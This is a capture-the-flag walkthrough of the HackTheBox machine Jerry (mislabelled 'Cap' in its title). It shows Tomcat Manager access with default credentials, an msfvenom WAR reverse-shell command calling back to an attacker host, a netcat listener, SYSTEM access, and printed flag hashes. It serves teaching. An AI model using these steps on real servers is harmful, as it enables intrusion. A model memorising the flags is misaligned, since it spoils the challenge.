<div align="center">
  <h1> Cap - HackTheBox Walkthrough</h1>
  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59f03a24178dbb2bdc94968c201e21f8.png" width="120" style="border-radius: 50%; border: 4px solid #9fef00;">

  <br>

  ### 📋 Machine Info
  **Name:** Jerry | **IP:** 10.129.136.9 | **OS:** Windows Server 2012 R2
  **Difficulty:** Easy | **Release:** June 30, 2018 | **Retired:** Nov 3, 2018
</div>


---

## 🔍 Reconnaissance

### What is Reconnaissance?

Reconnaissance (or "recon") is the first phase of penetration testing where we gather information about our target. Think of it like scouting before a battle - we need to know what we're dealing with!

### Initial Nmap Scan

**What is Nmap?**  
Nmap (Network Mapper) is a powerful network scanning tool that helps us discover:
- What ports are open on the target
- What services are running on those ports
- What versions of those services are installed

**Command Used:**

```bash
nu -d -p- -A 10.129.136.9
```

**Command Breakdown:**
- `nu` - Nmap Unleashed (a wrapper/alias for nmap)
- `-d` - Enable debugging (shows detailed progress)
- `-p-` - Scan ALL 65,535 ports (not just common ones)
  - `-p-` is shorthand for `-p1-65535`
  - By default, Nmap only scans ~1,000 common ports
- `-A` - Aggressive scan (enables OS detection, version detection, script scanning, and traceroute)
- `10.129.136.9` - Target IP address

**Why these flags?**
- `-d` helps us see what Nmap is doing in real-time
- `-p-` ensures we don't miss any services on uncommon ports
- `-A` gives us maximum information about each service

**Results:**

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

**Understanding the Results:**

| Port | Service | Version | What it means |
|------|---------|---------|---------------|
| 8080/tcp | HTTP | Apache Tomcat/Coyote JSP engine 1.1 | Web server running Apache Tomcat 7.0.88 |

**Operating System Detection:**
```
OS match: Microsoft Windows Server 2012 R2 (97%)
OS match: Microsoft Windows 7 or Windows Server 2008 R2 (91%)
```

**Key Takeaway:** We found a Tomcat web server running on a non-standard port (8080 instead of 80). This is our only entry point!

---

## 🌐 Web Enumeration

### What is Web Enumeration?

Web enumeration is the process of exploring a web application to understand its structure, functionality, and potential vulnerabilities. We're basically mapping out the website.

### Exploring Port 8080

**Why check port 8080?**  
Port 8080 is commonly used as an alternative HTTP port, especially for Tomcat servers. If it's open, there's a website we can investigate!

**How to access it:**

```bash
# Option 1: Use a web browser
firefox http://10.129.136.9:8080

# Option 2: Use curl from command line
curl http://10.129.136.9:8080
```

**What I Found:**  
A default Apache Tomcat installation page with:
- Tomcat logo and welcome message
- Version information: **Apache Tomcat/7.0.88**
- Links to documentation and configuration
- Buttons for "Server Status", "Manager App", and "Host Manager"

**Why is this important?**  
Default installations often have:
- Default credentials still enabled
- Well-known vulnerabilities
- Exposed management interfaces

### Directory Enumeration with Feroxbuster

**What is Feroxbuster?**  
Feroxbuster is a fast, recursive content discovery tool written in Rust. It helps us find hidden directories and files on web servers.

**Command Used:**

```bash
feroxbuster -u http://10.129.136.9:8080
```

**Command Breakdown:**
- `feroxbuster` - The directory brute-forcing tool
- `-u` - URL to scan
- `http://10.129.136.9:8080` - Target URL

**Key Findings:**

```
302  GET  0l  0w  0c  http://10.129.136.9:8080/manager => http://10.129.136.9:8080/manager/
401  GET  63l 289w 2536c http://10.129.136.9:8080/manager/html
401  GET  63l 289w 2536c http://10.129.136.9:8080/manager/status
401  GET  63l 289w 2536c http://10.129.136.9:8080/manager/text
302  GET  0l  0w  0c  http://10.129.136.9:8080/docs => http://10.129.136.9:8080/docs/
302  GET  0l  0w  0c  http://10.129.136.9:8080/examples => http://10.129.136.9:8080/examples/
```

**Understanding HTTP Status Codes:**
- **302** - Redirect (the page moved to another location)
- **401** - Unauthorized (authentication required)
- **200** - OK (page accessible)
- **404** - Not Found (page doesn't exist)

**Critical Discovery:**  
The `/manager` endpoint requires authentication (HTTP 401). This is the **Tomcat Manager** - a powerful web interface for deploying applications!

---

## 🔓 Authentication Discovery

### Attempting to Access Tomcat Manager

**What is Tomcat Manager?**  
Tomcat Manager is a web application that allows administrators to:
- Deploy new web applications (WAR files)
- Start/stop/reload applications
- View server status and statistics
- Manage running applications

**Why is this dangerous?**  
If an attacker gains access to Tomcat Manager, they can deploy malicious applications and execute arbitrary code on the server!

### Testing Default Credentials

When we navigate to `http://10.129.136.9:8080/manager/`, we're presented with a login dialog.

**What happens when we click "Cancel"?**  
The server redirects us to: `http://10.129.136.9:8080/manager/html`

And we see a **401 Unauthorized** error page!

### The Critical Information Leak

**What did the error page reveal?**

The 401 error page helpfully provides example configuration showing valid credentials:

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

**What does this mean?**
- **Username:** `tomcat`
- **Password:** `s3cret`
- **Role:** `manager-gui` (full access to web interface)

**Why is this a vulnerability?**  
This is a severe security misconfiguration:
1. **Default credentials** are still enabled
2. **Weak password** (simple dictionary word with leet-speak)
3. **Information disclosure** in error messages
4. The error page literally tells attackers the valid credentials!

**Related CWE:**
- **CWE-798:** Use of Hard-coded Credentials
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor

### Successful Authentication

**Testing the credentials:**

```bash
# Navigate to manager interface
firefox http://10.129.136.9:8080/manager/html

# Or use curl with authentication
curl -u tomcat:s3cret http://10.129.136.9:8080/manager/html
```

**Success! We're in!** 🎉

We now have access to the **Tomcat Web Application Manager** interface showing:
- List of deployed applications
- Server status and statistics
- **WAR file upload functionality** ← This is our exploitation vector!

---

## 💣 Exploitation - WAR File Upload

### What is a WAR File?

**WAR = Web Application Archive**

A WAR file is a packaged Java web application that can be deployed to Tomcat. Think of it like a ZIP file containing:
- Java Server Pages (JSP)
- Servlets (Java code)
- HTML/CSS/JavaScript
- Configuration files

**Why is this dangerous?**  
We can create a malicious WAR file containing a reverse shell, upload it through the manager, and get code execution!

### Creating a Malicious WAR File with MSFVenom

**What is MSFVenom?**  
MSFVenom is a payload generation tool from the Metasploit Framework. It can create malicious files in various formats (WAR, EXE, ELF, etc.) containing reverse shell payloads.

**Command Used:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.71 LPORT=4444 -f war -o shell.war
```

**Command Breakdown:**
- `msfvenom` - The payload generator
- `-p java/jsp_shell_reverse_tcp` - Payload type
  - `java` - For Java applications
  - `jsp` - Java Server Pages (runs on Tomcat)
  - `shell_reverse_tcp` - Opens a reverse shell connection
- `LHOST=10.10.14.71` - Your attacker machine IP (where the shell connects back to)
  - This is your HackTheBox VPN IP address
  - Find it with: `ip addr show tun0`
- `LPORT=4444` - Port to listen on for incoming connection
- `-f war` - Output format (Web Application Archive)
- `-o shell.war` - Output filename

**Output:**

```
Payload size: 1082 bytes
Final size of war file: 1082 bytes
Saved as: shell.war
```

**What's inside the WAR file?**  
The WAR file contains a JSP page that, when accessed, will:
1. Create a socket connection back to your machine
2. Redirect stdin/stdout/stderr through that connection
3. Give you a command shell on the target

### Setting Up the Listener

**Why do we need a listener?**  
A reverse shell connects *back* to us, so we need to be listening for that incoming connection!

**Command:**

```bash
nc -lvnp 4444
```

**Command Breakdown:**
- `nc` - Netcat, the "Swiss Army knife" of networking
- `-l` - Listen mode (wait for incoming connections)
- `-v` - Verbose (show connection details)
- `-n` - No DNS lookup (faster)
- `-p 4444` - Port to listen on (must match LPORT in payload)

**Output:**

```
listening on [any] 4444 ...
```

**Important:** Start the listener BEFORE uploading the WAR file!

### Uploading the Malicious WAR File

**Steps in Tomcat Manager:**

1. Navigate to `http://10.129.136.9:8080/manager/html`
2. Log in with credentials: `tomcat:s3cret`
3. Scroll down to the **"WAR file to deploy"** section
4. Click **"Browse..."** and select `shell.war`
5. Click **"Deploy"**

**What happens behind the scenes:**
1. Tomcat receives the WAR file
2. Extracts it to the webapps directory
3. Deploys it as a new application
4. The application appears in the "Applications" list with path `/shell`

### Triggering the Payload

**How to execute the reverse shell:**

Navigate to the deployed application:

```bash
# Option 1: Web browser
firefox http://10.129.136.9:8080/shell/

# Option 2: curl
curl http://10.129.136.9:8080/shell/
```

**What happens:**
1. Tomcat serves our malicious JSP page
2. The JSP code executes on the server
3. Opens a TCP connection back to our listener
4. We receive a shell!

**Listener receives connection:**

```
listening on [any] 4444 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

**Shell obtained! ✅**

---

## 🎯 Post-Exploitation

### Checking Our Privileges

**First command to run:**

```cmd
whoami
```

**Output:**

```
nt authority\system
```

**🚨 JACKPOT! 🚨**

**What does `nt authority\system` mean?**
- This is the Windows equivalent of "root" in Linux
- **SYSTEM** is the highest privilege level on Windows
- Even higher than Administrator!
- We have complete control over the machine

**Why did we get SYSTEM immediately?**  
This is a critical misconfiguration:
- The Tomcat service was running with SYSTEM privileges
- Services should follow the **Principle of Least Privilege**
- Tomcat only needs permissions to:
  - Read/write its own directories
  - Listen on network ports
  - NOT full system access!

**Related CWE:**
- **CWE-250:** Execution with Unnecessary Privileges

### System Information Gathering

**Command:**

```cmd
systeminfo
```

**Key Information:**

```
Host Name:                 JERRY
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC
Total Physical Memory:     4,095 MB
Domain:                    HTB
```

**What we learned:**
- Hostname: JERRY
- OS: Windows Server 2012 R2
- Architecture: 64-bit
- Domain: HTB (HackTheBox)

### Finding the Flags

**What are flags?**  
In HackTheBox, flags are special strings (hashes) that prove you successfully compromised the system. There are typically two:
- **user.txt** - Proof of initial access
- **root.txt** - Proof of privilege escalation (or in this case, immediate SYSTEM access)

### Exploring the File System

**Navigate to Users directory:**

```cmd
cd C:\Users
dir
```

**Output:**

```
Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          Administrator
06/18/2018  10:47 PM    <DIR>          Public
```

**Navigate to Administrator's Desktop:**

```cmd
cd C:\Users\Administrator\Desktop
dir
```

**Output:**

```
Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
```

**Interesting! A "flags" directory!**

**Enter the flags directory:**

```cmd
cd flags
dir
```

**Output:**

```
Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
```

**The filename is a hint!** "2 for the price of 1" suggests both flags are in one file!

### Capturing Both Flags

**Command:**

```cmd
type "2 for the price of 1.txt"
```

**Understanding the command:**
- `type` - Windows equivalent of Linux `cat` command
- `"2 for the price of 1.txt"` - Filename in quotes (because of spaces)

**Output:**

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

**Flags captured! ✅✅**

**Why both flags in one file?**  
Since we got SYSTEM privileges immediately (no privilege escalation needed), the machine creator combined both flags as a reward!

---

## 🔗 Attack Chain Summary

Here's the complete path from nothing to SYSTEM:

```
1. Nmap Scan
   └─> Discovered port 8080 running Apache Tomcat 7.0.88

2. Web Enumeration
   └─> Found default Tomcat installation page
   └─> Discovered /manager endpoint

3. Directory Enumeration
   └─> feroxbuster found protected /manager paths
   └─> HTTP 401 responses requiring authentication

4. Credential Discovery
   └─> Attempted to access /manager/html
   └─> 401 error page leaked default credentials
   └─> tomcat:s3cret

5. Manager Access
   └─> Successfully authenticated to Tomcat Manager
   └─> Gained WAR file upload capability

6. Payload Generation
   └─> Created malicious WAR file with msfvenom
   └─> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.71 LPORT=4444 -f war -o shell.war

7. Listener Setup
   └─> Started netcat listener: nc -lvnp 4444

8. WAR Upload & Deployment
   └─> Uploaded shell.war through Tomcat Manager
   └─> Tomcat automatically deployed to /shell

9. Shell Trigger
   └─> Accessed http://10.129.136.9:8080/shell/
   └─> Reverse shell connected back

10. Initial Access
    └─> Received Windows command shell
    └─> Checked privileges: whoami = nt authority\system
    └─> Already SYSTEM! (No privilege escalation needed)

11. Flag Capture
    └─> Navigated to C:\Users\Administrator\Desktop\flags\
    └─> Found "2 for the price of 1.txt"
    └─> user.txt: 7004dbcef0f854e0fb401875f26ebd00
    └─> root.txt: 04a8b36e1545a455393d067e772fe90e
```

---

## 🐛 Vulnerabilities Identified

| Vulnerability | CWE | Severity | Impact | Fix |
|---------------|-----|----------|--------|-----|
| Default Credentials | CWE-798 | **CRITICAL** | Complete system compromise | Change default passwords immediately |
| Weak Password | CWE-521 | **HIGH** | Easy to guess/crack | Enforce strong password policy |
| Information Disclosure | CWE-200 | **HIGH** | Error page reveals credentials | Customize error pages, remove sensitive info |
| Excessive Service Privileges | CWE-250 | **CRITICAL** | Service runs as SYSTEM | Run Tomcat as dedicated low-privilege user |
| Unrestricted Manager Access | CWE-284 | **HIGH** | No IP restrictions on manager | Restrict manager to localhost/admin IPs |
| Outdated Software | CWE-1035 | **MEDIUM** | Tomcat 7.0.88 (June 2018) | Update to latest stable version |

---

## 🎓 Learning Resources

### Apache Tomcat Security
- [Apache Tomcat Security Considerations](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
- [OWASP Tomcat Security](https://owasp.org/www-community/vulnerabilities/Tomcat)

### Penetration Testing
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### MSFVenom
- [MSFVenom Cheat Sheet](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Windows Privilege Escalation
- [Windows Privilege Escalation Guide](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

---

## 🏆 Conclusion

The Jerry machine teaches fundamental web application exploitation concepts:

**Key Skills Demonstrated:**
- ✅ Network reconnaissance with Nmap
- ✅ Web enumeration with Feroxbuster
- ✅ Identifying default credentials
- ✅ Exploiting Tomcat Manager
- ✅ Payload generation with MSFVenom
- ✅ Reverse shell techniques
- ✅ Windows post-exploitation

**Security Lessons:**
- ⚠️ Default credentials are a critical vulnerability
- ⚠️ Services should run with minimal privileges
- ⚠️ Administrative interfaces need strong protection
- ⚠️ Information disclosure can reveal attack vectors
- ⚠️ Regular updates and hardening are essential

**Machine Pwned!** 💀

---

**Flags:**
- **user.txt:** `7004dbcef0f854e0fb401875f26ebd00`
- **root.txt:** `04a8b36e1545a455393d067e772fe90e`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security on systems you don't own.*
